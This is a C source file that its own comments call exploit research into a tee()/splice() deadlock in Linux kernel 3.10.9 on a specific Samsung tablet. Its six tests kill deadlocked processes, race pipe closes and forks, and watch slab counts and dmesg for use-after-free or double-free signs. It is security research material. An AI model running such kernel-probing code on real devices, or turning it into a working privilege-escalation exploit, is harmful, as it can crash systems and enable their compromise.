/*
 * tee_deadlock_exploit.c — Exploit research for tee() deadlock bug
 *
 * CONFIRMED: tee() deadlocks on kernel 3.10.9 in two scenarios:
 *   A) tee(full_pipe → full_pipe) with SPLICE_F_NONBLOCK — ignores flag
 *   B) Circular tee (p1→p2, p2→p1) fills pipes and deadlocks
 *
 * This is a genuine kernel bug: SPLICE_F_NONBLOCK should prevent blocking
 * but tee's link_pipe() path does not honor it properly in 3.10.
 *
 * EXPLOITATION RESEARCH:
 *   1. Can SIGKILL during deadlock cause UAF in pipe cleanup?
 *   2. Does the deadlock leave pipe_inode_info in inconsistent state?
 *   3. Can we use the deadlock to hold pipe mutex while another thread
 *      does operations that assume the mutex is free?
 *   4. If tee holds both pipe mutexes when killed, does cleanup double-free?
 *
 * Also tests:
 *   - splice() deadlock (similar path)
 *   - Concurrent tee from multiple threads (ABBA deadlock)
 *   - tee + close race (pipe fd closed while tee blocks)
 *   - tee + fork (child inherits deadlocked state)
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o tee_deadlock_exploit tee_deadlock_exploit.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

#ifndef __NR_tee
#define __NR_tee 342
#endif
#ifndef __NR_splice
#define __NR_splice 340
#endif

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

/* Fill a pipe completely, return bytes written */
static int fill_pipe(int wfd) {
    fcntl(wfd, F_SETFL, O_NONBLOCK);
    char buf[4096];
    memset(buf, 'F', sizeof(buf));
    int total = 0;
    while (1) {
        ssize_t r = write(wfd, buf, sizeof(buf));
        if (r <= 0) break;
        total += r;
    }
    return total;
}

/* ========== TEST 1: SIGKILL during tee deadlock — cleanup corruption? ========== */

static void test_sigkill_cleanup(void) {
    printf("=== TEST 1: SIGKILL during tee deadlock ===\n");
    fflush(stdout);

    int corruptions = 0;

    for (int iter = 0; iter < 50; iter++) {
        int p1[2], p2[2];
        pipe(p1); pipe(p2);

        /* Minimize pipe sizes */
        fcntl(p1[0], 1031 /* F_SETPIPE_SZ */, 4096);
        fcntl(p2[0], 1031 /* F_SETPIPE_SZ */, 4096);

        /* Fill both pipes */
        fill_pipe(p1[1]);
        fill_pipe(p2[1]);

        /* Record slab state before */
        int k64_before = get_slab("kmalloc-64");
        int k128_before = get_slab("kmalloc-128");
        int k256_before = get_slab("kmalloc-256");
        int pipe_before = get_slab("pipe_inode_info");

        /* Fork child that will deadlock in tee */
        pid_t pid = fork();
        if (pid == 0) {
            /* This should deadlock — SPLICE_F_NONBLOCK is ignored */
            fcntl(p1[0], F_SETFL, 0);  /* Make blocking to ensure deadlock */
            fcntl(p2[1], F_SETFL, 0);
            long r = syscall(__NR_tee, p1[0], p2[1], 65536, 0);
            /* Should NOT reach here if deadlocked */
            printf("  [child] tee returned %ld (NOT deadlocked!)\n", r);
            _exit(0);
        }

        /* Wait a bit for child to enter deadlock */
        usleep(50000);  /* 50ms */

        /* Send SIGKILL — forces kernel cleanup of deadlocked state */
        kill(pid, SIGKILL);

        int status;
        waitpid(pid, &status, 0);

        /* Check slab state after — any leaks? */
        int k64_after = get_slab("kmalloc-64");
        int k128_after = get_slab("kmalloc-128");
        int k256_after = get_slab("kmalloc-256");
        int pipe_after = get_slab("pipe_inode_info");

        if (pipe_after != pipe_before ||
            k64_after != k64_before ||
            k128_after != k128_before) {
            printf("  [%d] SLAB DELTA: pipe=%+d k64=%+d k128=%+d k256=%+d\n",
                   iter,
                   pipe_after - pipe_before,
                   k64_after - k64_before,
                   k128_after - k128_before,
                   k256_after - k256_before);
            corruptions++;
        }

        /* Verify pipes are still usable */
        char verify[16];
        fcntl(p1[0], F_SETFL, O_NONBLOCK);
        ssize_t vr = read(p1[0], verify, sizeof(verify));
        if (vr < 0 && errno != EAGAIN) {
            printf("  [%d] PIPE CORRUPTION! read: errno=%d (%s)\n",
                   iter, errno, strerror(errno));
            corruptions++;
        }

        close(p1[0]); close(p1[1]);
        close(p2[0]); close(p2[1]);
    }

    printf("  50 SIGKILL iterations: slab anomalies=%d\n", corruptions);
}

/* ========== TEST 2: Concurrent tee ABBA deadlock ========== */

static int abba_p1[2], abba_p2[2];
static volatile int abba_go = 0;

static void *tee_forward(void *arg) {
    while (!abba_go) sched_yield();
    for (int i = 0; i < 1000; i++) {
        syscall(__NR_tee, abba_p1[0], abba_p2[1], 4096, 0x01 /* NONBLOCK */);
        /* Drain p2 to make room */
        char d[4096];
        fcntl(abba_p2[0], F_SETFL, O_NONBLOCK);
        read(abba_p2[0], d, sizeof(d));
    }
    return NULL;
}

static void *tee_backward(void *arg) {
    while (!abba_go) sched_yield();
    for (int i = 0; i < 1000; i++) {
        syscall(__NR_tee, abba_p2[0], abba_p1[1], 4096, 0x01 /* NONBLOCK */);
        /* Drain p1 to make room */
        char d[4096];
        fcntl(abba_p1[0], F_SETFL, O_NONBLOCK);
        read(abba_p1[0], d, sizeof(d));
    }
    return NULL;
}

static void test_abba_deadlock(void) {
    printf("\n=== TEST 2: Concurrent ABBA tee deadlock ===\n");
    fflush(stdout);

    pipe(abba_p1); pipe(abba_p2);
    fcntl(abba_p1[0], 1031, 4096);
    fcntl(abba_p2[0], 1031, 4096);

    /* Put some data in both pipes */
    write(abba_p1[1], "AAAA", 4);
    write(abba_p2[1], "BBBB", 4);

    abba_go = 0;
    pthread_t t1, t2;
    pthread_create(&t1, NULL, tee_forward, NULL);
    pthread_create(&t2, NULL, tee_backward, NULL);

    abba_go = 1;

    /* If threads deadlock, they won't join. Use timed approach. */
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += 5;

    int r1 = pthread_timedjoin_np(t1, NULL, &ts);
    int r2 = pthread_timedjoin_np(t2, NULL, &ts);

    if (r1 != 0 || r2 != 0) {
        printf("  *** ABBA DEADLOCK DETECTED! ***\n");
        printf("  t1 join: %s, t2 join: %s\n",
               r1 ? "TIMED OUT" : "ok", r2 ? "TIMED OUT" : "ok");
        /* Cancel stuck threads */
        pthread_cancel(t1);
        pthread_cancel(t2);
        usleep(100000);
    } else {
        printf("  No deadlock (both threads completed)\n");
    }

    close(abba_p1[0]); close(abba_p1[1]);
    close(abba_p2[0]); close(abba_p2[1]);
}

/* ========== TEST 3: tee + close race (fd closed during tee) ========== */

static void test_tee_close_race(void) {
    printf("\n=== TEST 3: tee + close race ===\n");
    fflush(stdout);

    int anomalies = 0;
    for (int iter = 0; iter < 200; iter++) {
        int p1[2], p2[2];
        pipe(p1); pipe(p2);
        fcntl(p1[0], 1031, 4096);
        fcntl(p2[0], 1031, 4096);

        /* Write data to p1 */
        char data[2048];
        memset(data, 'T', sizeof(data));
        write(p1[1], data, sizeof(data));

        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            /* Child: tee from p1 to p2 in a loop */
            for (int i = 0; i < 100; i++) {
                long r = syscall(__NR_tee, p1[0], p2[1], 4096,
                                 0x01 /* NONBLOCK */);
                if (r < 0 && errno == EBADF) break;
                /* Drain to prevent fill */
                char d[4096];
                fcntl(p2[0], F_SETFL, O_NONBLOCK);
                read(p2[0], d, sizeof(d));
            }
            _exit(0);
        }

        /* Parent: close pipe ends while child tees */
        usleep(100);  /* Let child start */
        close(p1[0]);  /* Close read end of source pipe */
        close(p2[1]);  /* Close write end of dest pipe */

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d!\n", iter, WTERMSIG(status));
            anomalies++;
        }

        close(p1[1]); close(p2[0]);
    }
    printf("  200 iterations, anomalies=%d\n", anomalies);
}

/* ========== TEST 4: tee + fork (shared pipe state) ========== */

static void test_tee_fork(void) {
    printf("\n=== TEST 4: tee + fork (shared pipe state) ===\n");
    fflush(stdout);

    int p1[2], p2[2];
    pipe(p1); pipe(p2);
    fcntl(p1[0], 1031, 4096);
    fcntl(p2[0], 1031, 4096);

    write(p1[1], "hello world", 11);

    /* Fork — both processes share pipe fds */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        /* Child: rapid tee + splice + read on shared pipes */
        for (int i = 0; i < 500; i++) {
            syscall(__NR_tee, p1[0], p2[1], 4096, 0x01);
            char d[256];
            fcntl(p2[0], F_SETFL, O_NONBLOCK);
            read(p2[0], d, sizeof(d));

            /* Splice from p1 to p2 (consumes data unlike tee) */
            syscall(__NR_splice, p1[0], NULL, p2[1], NULL, 4096,
                    0x03 /* MOVE | NONBLOCK */);
        }
        _exit(0);
    }

    /* Parent: also rapid tee + read on same pipes */
    for (int i = 0; i < 500; i++) {
        syscall(__NR_tee, p1[0], p2[1], 4096, 0x01);
        char d[256];
        fcntl(p1[0], F_SETFL, O_NONBLOCK);
        read(p1[0], d, sizeof(d));
        fcntl(p2[0], F_SETFL, O_NONBLOCK);
        read(p2[0], d, sizeof(d));

        /* Refill p1 */
        fcntl(p1[1], F_SETFL, O_NONBLOCK);
        write(p1[1], "data", 4);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  *** CRASH sig=%d ***\n", WTERMSIG(status));
    else
        printf("  Completed OK\n");

    close(p1[0]); close(p1[1]);
    close(p2[0]); close(p2[1]);
}

/* ========== TEST 5: Mass deadlock + SIGKILL storm ========== */

static void test_mass_deadlock_kill(void) {
    printf("\n=== TEST 5: Mass tee deadlock + SIGKILL storm ===\n");
    fflush(stdout);

    int k64_before = get_slab("kmalloc-64");
    int k256_before = get_slab("kmalloc-256");
    int pipe_before = get_slab("pipe_inode_info");

    pid_t pids[20];
    int count = 0;

    /* Spawn 20 processes that all deadlock in tee */
    for (int i = 0; i < 20; i++) {
        int p1[2], p2[2];
        pipe(p1); pipe(p2);
        fcntl(p1[0], 1031, 4096);
        fcntl(p2[0], 1031, 4096);
        fill_pipe(p1[1]);
        fill_pipe(p2[1]);

        pids[i] = fork();
        if (pids[i] == 0) {
            /* Deadlock in blocking tee */
            fcntl(p1[0], F_SETFL, 0);
            fcntl(p2[1], F_SETFL, 0);
            syscall(__NR_tee, p1[0], p2[1], 65536, 0);
            _exit(0);
        }
        count++;
        /* Close our copies — child still has them */
        close(p1[0]); close(p1[1]);
        close(p2[0]); close(p2[1]);
    }

    /* Wait for all to enter deadlock */
    usleep(100000);  /* 100ms */

    /* SIGKILL all at once */
    printf("  Killing %d deadlocked processes...\n", count);
    for (int i = 0; i < count; i++) {
        kill(pids[i], SIGKILL);
    }

    /* Reap all */
    for (int i = 0; i < count; i++) {
        int status;
        waitpid(pids[i], &status, 0);
    }

    /* Check slab state — leaked objects? */
    usleep(100000);  /* Let kernel clean up */
    int k64_after = get_slab("kmalloc-64");
    int k256_after = get_slab("kmalloc-256");
    int pipe_after = get_slab("pipe_inode_info");

    printf("  Slab delta after mass kill:\n");
    printf("    kmalloc-64:  %+d\n", k64_after - k64_before);
    printf("    kmalloc-256: %+d\n", k256_after - k256_before);
    printf("    pipe_inode_info: %+d\n", pipe_after - pipe_before);

    if (pipe_after > pipe_before + 2) {
        printf("  *** PIPE SLAB LEAK DETECTED! ***\n");
    }
}

/* ========== TEST 6: splice deadlock (same pattern as tee) ========== */

static void test_splice_deadlock(void) {
    printf("\n=== TEST 6: splice deadlock test ===\n");
    fflush(stdout);

    int p1[2], p2[2];
    pipe(p1); pipe(p2);
    fcntl(p1[0], 1031, 4096);
    fcntl(p2[0], 1031, 4096);

    /* Fill p1 with data, fill p2 completely */
    fill_pipe(p1[1]);
    fill_pipe(p2[1]);

    /* Try splice from p1 to full p2 */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        fcntl(p1[0], F_SETFL, 0);
        fcntl(p2[1], F_SETFL, 0);
        /* This might deadlock like tee */
        long r = syscall(__NR_splice, p1[0], NULL, p2[1], NULL,
                         65536, 0 /* NO nonblock flag */);
        printf("  splice returned %ld\n", r);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status) && WTERMSIG(status) == 14)
        printf("  *** splice DEADLOCKED! ***\n");
    else
        printf("  splice completed normally\n");

    close(p1[0]); close(p1[1]);
    close(p2[0]); close(p2[1]);
}

/* ========== MAIN ========== */

static void check_dmesg(void) {
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|poison|Backtrace|Unable|"
           "slab|list_del|use.after|double|bad.page|WARNING|pipe|splice|tee' "
           "2>/dev/null");
}

int main(void) {
    printf("=== tee() Deadlock Exploit Research ===\n");
    printf("SM-T377A kernel 3.10.9 — SPLICE_F_NONBLOCK bypass\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    signal(SIGSEGV, SIG_DFL);
    signal(SIGBUS, SIG_DFL);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    struct {
        const char *name;
        void (*func)(void);
    } tests[] = {
        { "SIGKILL cleanup", test_sigkill_cleanup },
        { "ABBA deadlock", test_abba_deadlock },
        { "tee+close race", test_tee_close_race },
        { "tee+fork race", test_tee_fork },
        { "mass deadlock+kill", test_mass_deadlock_kill },
        { "splice deadlock", test_splice_deadlock },
        { NULL, NULL }
    };

    for (int i = 0; tests[i].name; i++) {
        printf("--- %s ---\n", tests[i].name);
        fflush(stdout);

        pid_t pid = fork();
        if (pid == 0) {
            alarm(30);
            tests[i].func();
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            if (sig == 14) printf("*** %s: HUNG ***\n", tests[i].name);
            else printf("*** %s: CRASHED sig=%d ***\n", tests[i].name, sig);
        }
        printf("dmesg: "); check_dmesg(); printf("\n\n");
    }

    printf("=== Research complete ===\n");
    return 0;
}
